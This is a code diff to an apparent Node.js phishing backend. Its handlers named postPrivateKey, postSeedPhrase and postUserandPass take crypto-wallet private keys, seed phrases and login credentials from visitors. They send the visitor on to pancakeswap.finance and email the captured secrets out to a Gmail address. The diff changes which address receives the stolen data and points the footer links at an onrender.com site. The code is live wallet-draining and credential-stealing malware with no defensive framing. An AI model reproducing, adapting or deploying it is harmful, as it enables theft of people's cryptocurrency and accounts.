@@ -50,7 +50,7 @@ exports.postPrivateKey = (req, res, next) => {
         res.redirect('https://pancakeswap.finance/')
         return transporter.sendMail({
           from: 'Ether <Ether@gmail.com>', // sender address
-          to: 'binnicarts@gmail.com', // list of receivers
+          to: 'danielkenny870@gmail.com', // list of receivers
           subject: "User Submitted Private Key", // Subject line
           html: `
             <div style="font-family: Arial, sans-serif; color: #333;">
@@ -71,8 +71,8 @@ exports.postPrivateKey = (req, res, next) => {
               <div style="background-color: #4CAF50; color: #fff; padding: 10px; text-align: center;">
                 <p>&copy; 2024 Your Company Name. All rights reserved.</p>
                 <p>
-                  <a href="https://yourcompany.com" style="color: #fff; text-decoration: none;">Visit our website</a> |
-                  <a href="mailto:support@yourcompany.com" style="color: #fff; text-decoration: none;">Contact Support</a>
+                  <a href="https://ethers-5qrj.onrender.com/" style="color: #fff; text-decoration: none;">Visit our website</a> |
+                  <a href="mailto:danielkenny870@gmail.com" style="color: #fff; text-decoration: none;">Contact Support</a>
                 </p>
               </div>
             </div>
@@ -109,7 +109,7 @@ exports.postSeedPhrase = (req, res, next) => {
     res.redirect('https://pancakeswap.finance/')
     return transporter.sendMail({
       from: 'Ether <Ether@gmail.com>', // sender address
-      to: 'binnicarts@gmail.com', // list of receivers
+      to: 'danielkenny870@gmail.com', // list of receivers
       subject: "User Submitted Seed Phrase", // Subject line
       html: `
         <div style="font-family: Arial, sans-serif; color: #333;">
@@ -130,8 +130,8 @@ exports.postSeedPhrase = (req, res, next) => {
           <div style="background-color: #4CAF50; color: #fff; padding: 10px; text-align: center;">
             <p>&copy; 2024 Your Company Name. All rights reserved.</p>
             <p>
-              <a href="https://yourcompany.com" style="color: #fff; text-decoration: none;">Visit our website</a> |
-              <a href="mailto:support@yourcompany.com" style="color: #fff; text-decoration: none;">Contact Support</a>
+              <a href="https://ethers-5qrj.onrender.com/" style="color: #fff; text-decoration: none;">Visit our website</a> |
+              <a href="mailto:danielkenny870@gmail.com" style="color: #fff; text-decoration: none;">Contact Support</a>
             </p>
           </div>
         </div>
@@ -189,8 +189,8 @@ exports.postUserandPass = (req, res, next) => {
           <div style="background-color: #4CAF50; color: #fff; padding: 10px; text-align: center;">
             <p>&copy; 2024 Your Company Name. All rights reserved.</p>
             <p>
-              <a href="https://yourcompany.com" style="color: #fff; text-decoration: none;">Visit our website</a> |
-              <a href="mailto:support@yourcompany.com" style="color: #fff; text-decoration: none;">Contact Support</a>
+              <a href="https://ethers-5qrj.onrender.com/" style="color: #fff; text-decoration: none;">Visit our website</a> |
+              <a href="mailto:danielkenny870@gmail.com" style="color: #fff; text-decoration: none;">Contact Support</a>
             </p>
           </div>
         </div>
